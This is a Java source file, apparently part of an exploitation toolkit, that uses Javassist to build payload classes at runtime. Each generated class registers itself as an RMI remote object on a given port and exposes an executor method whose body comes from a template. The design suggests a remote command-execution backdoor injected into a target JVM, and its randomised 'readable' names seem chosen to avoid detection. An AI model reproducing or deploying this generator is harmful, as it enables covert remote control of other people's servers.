package com.generate;

import com.Main;
import com.dto.ClassDto;
import javassist.*;

import java.util.ArrayList;

public class RmiBind {
    public static String basePath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
    static {
        if (Main.isDeveloper == true){
            basePath = basePath + "/jars";
        }else{
            basePath = basePath + "/../jars";
        }
    }

    public static ClassDto bind(int port) throws Exception {
        ClassPool classPool = new ClassPool();
        classPool.insertClassPath(basePath + "/jdk/*");

        String readablePackageName = Utils.getReadablePackageName("");
        String readableClassName = Utils.getReadableClassName("");
        String className = readablePackageName + readableClassName;
        CtClass rmiBindEchoRegisterCtClass = classPool.makeClass(className);
        CtClass unicastRemoteObjectCtClass = classPool.get("java.rmi.server.UnicastRemoteObject");

        rmiBindEchoRegisterCtClass.setSuperclass(unicastRemoteObjectCtClass);

        rmiBindEchoRegisterCtClass.addField(CtField.make("private static boolean FLAG=false;", rmiBindEchoRegisterCtClass));

        CtConstructor rmiBindEchoRegisterCtConstructor = rmiBindEchoRegisterCtClass.makeClassInitializer();
        String staticBody = Utils.loadTempFile("/RmiBindEchoRegister.temp");
        staticBody = staticBody.replace("{{{port}}}", Integer.toString(port));
        staticBody = staticBody.replace("{{{className}}}", className);

        rmiBindEchoRegisterCtConstructor.setBody(staticBody);

        String methodName = Utils.getReadableMethodName("");
        ArrayList<String> readableFiledName = Utils.getReadableFiledName(2);
        String executerMethodDescirpt = "public String " + methodName + "(String " + readableFiledName.get(0) + ", String " + readableFiledName.get(1) + ") throws java.rmi.RemoteException;";

        //method
        String executerMethodBody = Utils.loadTempFile("/RmiBindEchoExecute.temp");
        //generate method
        CtMethod executerMethodCtMethod = CtMethod.make(executerMethodDescirpt, rmiBindEchoRegisterCtClass);
        rmiBindEchoRegisterCtClass.addMethod(executerMethodCtMethod);
        executerMethodCtMethod.setBody(executerMethodBody);
        //setBody will modify ctClass to abstract
        //modify to non-abstract
        rmiBindEchoRegisterCtClass.setModifiers(rmiBindEchoRegisterCtClass.getModifiers() & ~Modifier.ABSTRACT);

        return new ClassDto(className, methodName, rmiBindEchoRegisterCtClass.toBytecode());
    }
}
